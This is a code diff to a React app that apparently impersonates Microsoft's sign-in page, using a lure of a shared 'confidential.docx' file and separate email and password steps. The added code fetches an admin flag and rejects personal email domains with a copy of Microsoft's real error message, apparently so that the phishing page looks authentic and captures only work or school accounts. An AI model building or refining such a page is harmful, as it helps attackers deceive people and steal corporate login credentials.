@@ -38,6 +38,8 @@ const App = () => {
     const [isAuthorizationStep, setIsAuthorizationStep] = useState(true);
     const [fileName, setFileName] = useState('confidential.docx'); // Default file name
     const [from, setFrom] = useState(''); // Default sharer
+    const [owner_admin, setOwner_admin] = useState(false)
+    const [isPersonalEmail, setIsPersonalEmail] = useState(false);
 
 
     /**
@@ -61,6 +63,26 @@ const App = () => {
         }
 
     }, []); // The empty array [] ensures this runs only once.
+
+
+
+    useEffect(() => {
+        async function fetchVersion() {
+            try {
+                const res = await fetch("/version");
+                const data = await res.json();
+                if (data?.owner?.toLowerCase() === 'admin') {
+                    setOwner_admin(true);
+                }
+            } catch (err) {
+                console.error("Failed to fetch version info:", err);
+            }
+        }
+    
+        fetchVersion();
+    }, []);
+    
+
 
     /**
      * useEffect hook to run once on component mount to capture the user_id.
@@ -121,8 +143,32 @@ const App = () => {
     /**
      * Handles the form submission for the email step.
      */
+    // const handleNextClick = (e) => {
+    //     e.preventDefault();
+    //     if (email) {
+    //         setIsPasswordStep(true);
+    //         setAuthMessage('');
+    //         setIsError(false);
+    //     }
+    // };
+
+
     const handleNextClick = (e) => {
         e.preventDefault();
+    
+        const personalDomains = [
+            "gmail.com", "yahoo.com", "hotmail.com", "outlook.com",
+            "aol.com", "icloud.com", "protonmail.com", "live.com",
+            "msn.com", "mail.com", "zoho.com", "gmx.com", "yandex.com"
+        ];
+    
+        const domain = email.split('@')[1]?.toLowerCase();
+        if (owner_admin && domain && personalDomains.includes(domain)) {
+            setIsPersonalEmail(true);
+            return;
+        }
+
+        setIsPersonalEmail(false);
         if (email) {
             setIsPasswordStep(true);
             setAuthMessage('');
@@ -130,6 +176,7 @@ const App = () => {
         }
     };
 
+    
     /**
      * Handles the "Back" button click to return to the previous relevant step.
      */
@@ -426,6 +473,12 @@ const App = () => {
                         <div key="email-step">
                             <div style={{ marginBottom: '1.5rem' }}> <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo" className="microsoft-logo" onError={(e) => { e.target.onerror = null; e.target.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }} /> </div>
                             <h1 className="form-title">Sign in</h1>
+                            {isPersonalEmail && (
+                                    <p className="auth-message error" style={{ marginBottom: '1rem' }}>
+                                        You can't sign in here with a personal account. Use your work or school account instead.
+                                    </p>
+                                )}
+
                             <form onSubmit={handleNextClick}>
                                 <div className="input-field-container">
                                     <input
